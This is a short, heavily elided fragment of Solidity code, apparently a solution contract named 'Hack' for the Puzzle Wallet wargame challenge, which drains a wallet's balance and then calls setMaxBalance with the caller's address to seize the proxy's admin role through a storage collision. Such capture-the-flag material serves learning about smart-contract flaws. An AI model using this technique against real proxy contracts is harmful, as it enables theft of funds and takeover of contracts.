...
contract Hack {
    ...
    constructor(address contract_address) payable {
        proxy = PuzzleProxy(contract_address);
        wallet = PuzzleWallet(contract_address);
    ...
    function hack() public {
        ...
        require(address(wallet).balance == 0, "Balance isn't fully drained");

        wallet.setMaxBalance(uint256(uint160(msg.sender)));
        require(proxy.admin() == msg.sender, "You are still not admin");
